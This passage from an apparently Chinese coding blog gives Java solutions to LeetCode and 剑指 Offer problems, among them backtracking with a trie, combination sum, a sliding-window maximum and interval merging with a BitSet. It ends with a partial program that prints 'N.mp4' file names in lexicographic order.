&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; board[<span class="number">0</span>].length; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (dfs(board, word, i , j , <span class="number">0</span>)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">dfs</span><span class="params">(<span class="type">char</span>[][] board, String word, <span class="type">int</span> i, <span class="type">int</span> j, <span class="type">int</span> start)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (start == word.length()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">0</span> || i &gt;= board.length || j &lt; <span class="number">0</span> || j &gt;= board[<span class="number">0</span>].length || board[i][j] != word.charAt(start)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        board[i][j] += <span class="number">256</span>;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">result</span> <span class="operator">=</span> dfs(board, word ,i - <span class="number">1</span>, j, start + <span class="number">1</span>) || dfs(board, word ,i + <span class="number">1</span>, j, start + <span class="number">1</span>) || dfs(board, word ,i, j - <span class="number">1</span>, start + <span class="number">1</span>) || dfs(board, word ,i, j + <span class="number">1</span>, start + <span class="number">1</span>) ;</span><br><span class="line">        board[i][j] -= <span class="number">256</span>;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 回溯 + 字典树</span></span><br><span class="line"><span class="comment">// 可以省去查找重复单词的时间</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">findWords</span><span class="params">(<span class="type">char</span>[][] board, String[] words)</span> &#123;</span><br><span class="line">        List&lt;String&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="type">WordTrie</span> <span class="variable">wordTrie</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WordTrie</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> board.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> board[<span class="number">0</span>].length;</span><br><span class="line">        <span class="type">TrieNode</span> <span class="variable">root</span> <span class="operator">=</span> wordTrie.root;</span><br><span class="line">        <span class="keyword">for</span> (String word :</span><br><span class="line">                words) &#123;</span><br><span class="line">            wordTrie.insert(word);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">boolean</span>[][] visited = <span class="keyword">new</span> <span class="title class_">boolean</span>[m][n];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                dfs(board, root, i, j, res, visited);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(<span class="type">char</span>[][] board, TrieNode cur, <span class="type">int</span> i, <span class="type">int</span> j, List&lt;String&gt; res, <span class="type">boolean</span>[][] visited)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">0</span> || i &gt;= board.length || j &lt; <span class="number">0</span> || j &gt;= board[<span class="number">0</span>].length || visited[i][j]) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cur = cur.child[board[i][j] - <span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (cur == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        visited[i][j] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (cur.isEnd) &#123;</span><br><span class="line">            res.add(cur.val);</span><br><span class="line">            cur.isEnd = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        dfs(board, cur, i + <span class="number">1</span>, j, res, visited);</span><br><span class="line">        dfs(board, cur, i - <span class="number">1</span>, j, res, visited);</span><br><span class="line">        dfs(board, cur, i, j + <span class="number">1</span>, res, visited);</span><br><span class="line">        dfs(board, cur, i, j - <span class="number">1</span>, res, visited);</span><br><span class="line">        visited[i][j] = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">TrieNode</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> TrieNode[] child;</span><br><span class="line">        <span class="keyword">public</span> String val;</span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> isEnd;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">TrieNode</span><span class="params">()</span> &#123;</span><br><span class="line">            val = <span class="literal">null</span>;</span><br><span class="line">            isEnd = <span class="literal">false</span>;</span><br><span class="line">            child = <span class="keyword">new</span> <span class="title class_">TrieNode</span>[<span class="number">26</span>];</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">26</span>; i++) &#123;</span><br><span class="line">                child[i] = <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">WordTrie</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> TrieNode root;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">WordTrie</span><span class="params">()</span> &#123;</span><br><span class="line">            root = <span class="keyword">new</span> <span class="title class_">TrieNode</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insert</span><span class="params">(String s)</span> &#123;</span><br><span class="line">            <span class="type">TrieNode</span> <span class="variable">cur</span> <span class="operator">=</span> root;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">char</span> c :</span><br><span class="line">                    s.toCharArray()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (cur.child[c - <span class="string">&#x27;a&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line">                    cur.child[c - <span class="string">&#x27;a&#x27;</span>] = <span class="keyword">new</span> <span class="title class_">TrieNode</span>();</span><br><span class="line">                &#125;</span><br><span class="line">                cur = cur.child[c - <span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            cur.isEnd = <span class="literal">true</span>;</span><br><span class="line">            cur.val = s;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="39-组合总和"><a href="#39-组合总和" class="headerlink" title=" 39. 组合总和"></a><a href="https://leetcode-cn.com/problems/combination-sum"> 39. 组合总和</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">combinationSum</span><span class="params">(<span class="type">int</span>[] candidates, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        Arrays.sort(candidates);</span><br><span class="line">        ArrayList&lt;Integer&gt; path = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        backtrack(candidates, target, res, <span class="number">0</span>, path);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">backtrack</span><span class="params">(<span class="type">int</span>[] candidates, <span class="type">int</span> target, List&lt;List&lt;Integer&gt;&gt; res, <span class="type">int</span> i, ArrayList&lt;Integer&gt; path)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (target &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (target == <span class="number">0</span>) &#123;</span><br><span class="line">            res.add(<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(path));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> i; start &lt; candidates.length; start++) &#123;</span><br><span class="line">            path.add(candidates[start]);</span><br><span class="line">            backtrack(candidates, target - candidates[start], res, start, path);</span><br><span class="line">            path.remove(path.size() - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h2><h3 id="剑指-Offer-59-I-滑动窗口的最大值"><a href="#剑指-Offer-59-I-滑动窗口的最大值" class="headerlink" title="剑指 Offer 59 - I. 滑动窗口的最大值"></a><a href="https://leetcode-cn.com/problems/hua-dong-chuang-kou-de-zui-da-zhi-lcof/">剑指 Offer 59 - I. 滑动窗口的最大值</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 单调队列</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] maxSlidingWindow(<span class="type">int</span>[] nums, <span class="type">int</span> k) &#123;</span><br><span class="line">        <span class="keyword">if</span>(nums == <span class="literal">null</span> || nums.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[nums.length - k + <span class="number">1</span>];</span><br><span class="line">        Deque&lt;Integer&gt; deque = <span class="keyword">new</span> <span class="title class_">ArrayDeque</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; k; i++) &#123;</span><br><span class="line">            <span class="keyword">while</span> (!deque.isEmpty() &amp;&amp; nums[i] &gt; deque.peekLast()) &#123;</span><br><span class="line">                deque.pollLast();</span><br><span class="line">            &#125;</span><br><span class="line">            deque.addLast(nums[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        res[<span class="number">0</span>] = deque.peekFirst();</span><br><span class="line">        <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> k; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i - k] == deque.peekFirst()) &#123;</span><br><span class="line">                deque.pollFirst();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (!deque.isEmpty() &amp;&amp; nums[i] &gt; deque.peekLast()) &#123;</span><br><span class="line">                deque.pollLast();</span><br><span class="line">            &#125;</span><br><span class="line">            deque.addLast(nums[i]);</span><br><span class="line">            res[j++] = deque.peekFirst();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h2><h3 id="剑指-Offer-16-数值的整数次方"><a href="#剑指-Offer-16-数值的整数次方" class="headerlink" title="剑指 Offer 16. 数值的整数次方"></a><a href="https://leetcode-cn.com/problems/shu-zhi-de-zheng-shu-ci-fang-lcof/">剑指 Offer 16. 数值的整数次方</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">myPow</span><span class="params">(<span class="type">double</span> x, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(n == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(n == <span class="number">1</span>) <span class="keyword">return</span> x;</span><br><span class="line">        <span class="keyword">if</span>(n == -<span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span> / x;</span><br><span class="line">        <span class="type">double</span> <span class="variable">half</span> <span class="operator">=</span> myPow(x, n / <span class="number">2</span>);</span><br><span class="line">        <span class="type">double</span> <span class="variable">mod</span> <span class="operator">=</span> myPow(x, n % <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">return</span> half * half * mod;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="剑指-Offer-28-对称的二叉树"><a href="#剑指-Offer-28-对称的二叉树" class="headerlink" title="剑指 Offer 28. 对称的二叉树"></a><a href="https://leetcode-cn.com/problems/dui-cheng-de-er-cha-shu-lcof/">剑指 Offer 28. 对称的二叉树</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isSymmetric</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> helper(root.left, root.right);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">helper</span><span class="params">(TreeNode root1, TreeNode root2)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root1 == <span class="literal">null</span> &amp;&amp; root2 == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (root1 == <span class="literal">null</span> || root2 == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root1.val == root2.val &amp;&amp; helper(root1.left, root2.right) &amp;&amp; helper(root1.right, root2.left);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h2><h3 id="剑指-Offer-61-扑克牌中的顺子"><a href="#剑指-Offer-61-扑克牌中的顺子" class="headerlink" title="剑指 Offer 61. 扑克牌中的顺子"></a><a href="https://leetcode-cn.com/problems/bu-ke-pai-zhong-de-shun-zi-lcof/">剑指 Offer 61. 扑克牌中的顺子</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 用set判断重复, 又重复则不可能是顺子; 用max和min记录最大最小值, 如果max - min &lt; 5且没有重复就是顺子;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isStraight</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        Set&lt;Integer&gt; repeat = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> <span class="number">0</span>, min = <span class="number">14</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num :</span><br><span class="line">                nums) &#123;</span><br><span class="line">            <span class="keyword">if</span> (num == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            max = Math.max(num, max);</span><br><span class="line">            min = Math.min(num, min);</span><br><span class="line">            <span class="keyword">if</span> (repeat.contains(num)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            repeat.add(num);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> max - min &lt; <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="双指针"><a href="#双指针" class="headerlink" title="双指针"></a>双指针</h2><h3 id="剑指-Offer-57-和为s的两个数字"><a href="#剑指-Offer-57-和为s的两个数字" class="headerlink" title="剑指 Offer 57. 和为s的两个数字"></a><a href="https://leetcode-cn.com/problems/he-wei-sde-liang-ge-shu-zi-lcof/">剑指 Offer 57. 和为s的两个数字</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 有序用双指针, 无序用map或者set</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] twoSum(<span class="type">int</span>[] nums, <span class="type">int</span> target) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">l</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">r</span> <span class="operator">=</span> nums.length -<span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">            sum = nums[l] + nums[r];</span><br><span class="line">            <span class="keyword">if</span> (sum == target) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;nums[l], nums[r]&#125;;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (sum &gt; target) &#123;</span><br><span class="line">                r--;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                l++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Bitmap"><a href="#Bitmap" class="headerlink" title="Bitmap"></a>Bitmap</h2><h3 id="56-合并区间"><a href="#56-合并区间" class="headerlink" title="56. 合并区间"></a><a href="https://leetcode-cn.com/problems/merge-intervals">56. 合并区间</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.BitSet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[][] merge(<span class="type">int</span>[][] intervals) &#123;</span><br><span class="line">        <span class="type">BitSet</span> <span class="variable">bitSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BitSet</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span>[] interval :</span><br><span class="line">                intervals) &#123;</span><br><span class="line">            <span class="comment">// 比如[1,4]和[5,6]两个区间在数轴上是不连续的，但在BitSet上却是连续的。</span></span><br><span class="line">            <span class="comment">// 乘2是为了让它们从BitSet上看也是不连续的</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> interval[<span class="number">1</span>] * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">            bitSet.set(interval[<span class="number">0</span>] * <span class="number">2</span>, tmp, <span class="literal">true</span>);</span><br><span class="line">            max = tmp &gt;= max ? tmp : max;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>, count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (index &lt; max) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> bitSet.nextSetBit(index);</span><br><span class="line">            <span class="type">int</span> <span class="variable">end</span> <span class="operator">=</span> bitSet.nextClearBit(start);</span><br><span class="line">            <span class="type">int</span>[] tmp = <span class="keyword">new</span> <span class="title class_">int</span>[] &#123;start / <span class="number">2</span>, (end - <span class="number">1</span>) / <span class="number">2</span>&#125;;</span><br><span class="line">            intervals[count++] = tmp;</span><br><span class="line">            index = end;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span>[][] res = <span class="keyword">new</span> <span class="title class_">int</span>[count][<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; count; i++) &#123;</span><br><span class="line">            res[i] = intervals[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="chaos"><a href="#chaos" class="headerlink" title="chaos"></a>chaos</h1><h2 id="1-n-mp4-输出按字典序的前50个"><a href="#1-n-mp4-输出按字典序的前50个" class="headerlink" title="1-n.mp4 输出按字典序的前50个"></a>1-n.mp4 输出按字典序的前50个</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Copyright (C) 2022 THL A29 Limited, a Tencent company. All rights reserved.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="keyword">while</span> (sc.hasNext()) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> sc.nextInt();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (n &gt;= <span class="number">100000000</span> &amp;&amp; n &lt;= <span class="number">1000000000</span>) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">50</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= n; i *= <span class="number">10</span>) &#123;</span><br><span class="line">                    System.out.println(i + <span class="string">&quot;.mp4&quot;</span>);</span><br><span class="line">                    left--;</span><br><span class="line">                &#125;</span><br><span class="line">                func(<span class="number">100000000</span>, n, left);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (n &gt;= <span class="number">10000000</span> &amp;&amp; n &lt; <span class="number">100000000</span>) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">50</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= n; i *= <span class="number">10</span>) &#123;</span><br><span class="line">                    System.out.println(i + <span class="string">&quot;.mp4&quot;</span>);</span><br><span class="line">                    left--;</span><br><span class="line">                &#125;</span><br><span class="line">                func(<span class="number">10000000</span>, n, left);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (n &gt;= <span class="number">1000000</span> &amp;&amp; n &lt; <span class="number">10000000</span>) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">50</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= n; i *= <span class="number">10</span>) &#123;</span><br><span class="line">                    System.out.println(i + <span class="string">&quot;.mp4&quot;</span>);</span><br><span class="line">                    left--;</span><br><span class="line">                &#125;</span><br><span class="line">                func(<span class="number">1000000</span>, n, left);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (n &gt;= <span class="number">100000</span> &amp;&amp; n &lt; <span class="number">1000000</span>) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">50</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= n; i *= <span class="number">10</span>) &#123;</span><br><span class="line">                    System.out.println(i + <span class="string">&quot;.mp4&quot;</span>);</span><br><span class="line">                    left--;</span><br><span class="line">                &#125;</span><br><span class="line">                func(<span class="number">100000</span>, n, left);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (n &gt;= <span class="number">10000</span> &amp;&amp; n &lt; <span class="number">100000</span>) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">50</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= n; i *= <span class="number">10</span>) &#123;</span><br><span class="line">                    System.out.println(i + <span class="string">&quot;.mp4&quot;</span>);</span><br><span class="line">                    left--;</span><br><span class="line">                &#125;</span><br><span class="line">                func(<span class="number">10000</span>, n, left);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (n &gt;= <span class="number">1000</span> &amp;&amp; n &lt; <span class="number">10000</span>) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">50</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= n; i *= <span class="number">10</span>) &#123;</span><br><span class="line">                    System.out.println(i + <span class="string">&quot;.mp4&quot;</span>);</span><br><span class="line">                    left--;</span><br><span class="line">                &#125;</span><br><span class="line">                func(<span class="number">1000</span>, n, left);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (n &gt;= <span class="number">100</span> &amp;&amp; n &lt; <span class="number">1000</span>) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">50</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= n; i *= <span class="number">10</span>) &#123;</span><br><span class="line">                    System.out.println(i + <span class="string">&quot;.mp4&quot;</span>);</span><br><span class="line">                    left--;</span><br><span class="line">                &#125;</span><br><span class="line">                func(<span class="number">100</span>, n, left);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (n &gt; <span class="number">50</span> &amp;&amp; n &lt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="comment">// 10</span></span><br><span class="line">                System.out.println(<span class="string">&quot;1.mp4&quot;</span>);</span><br><span class="line">                <span class="comment">// 9</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;= <span class="number">9</span>; i++) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;1&quot;</span> + i + <span class="string">&quot;.mp4&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                System.out.println(<span class="string">&quot;2.mp4&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 10</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;= <span class="number">9</span>; i++) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;2&quot;</span> + i + <span class="string">&quot;.mp4&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                System.out.println(<span class="string">&quot;3.mp4&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 10</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;= 